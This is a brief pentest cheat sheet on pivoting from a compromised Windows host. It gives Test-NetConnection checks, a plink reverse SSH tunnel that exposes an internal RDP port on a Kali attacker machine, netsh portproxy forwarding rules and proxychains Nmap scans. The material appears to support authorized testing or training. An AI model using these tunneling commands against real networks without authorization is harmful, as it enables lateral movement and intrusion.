# Windows pivots and proxy checks

[← Pivoting quick reference](../06-pivoting.md)

## Check reachability from the foothold

Test pivot → one target/port:

```powershell
Test-NetConnection -ComputerName <internal-ip> -Port 445
Test-NetConnection -ComputerName <internal-ip> -Port 3389
```

## Forward one TCP port

Plink: Windows SSHes to Kali; expose internal service on Kali loopback:

```cmd
plink.exe -ssh -l <kali-user> -pw <password> -R 127.0.0.1:3389:<internal-ip>:3389 <kali-ip>
```

`netsh portproxy`: admin + IP Helper; listen on pivot, forward to internal target:

```cmd
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=3389 connectaddress=<internal-ip> connectport=3389
netsh interface portproxy show all
```

Remove: `netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=3389`.

## Proxychains checks

Proxychains → actual SOCKS listener; Nmap TCP connect/no ping:

```bash
proxychains nmap -sT -Pn -p 445 <internal-ip>
```

IP works/name fails: check DNS and `proxy_dns`. SOCKS does not carry Nmap SYN/UDP.
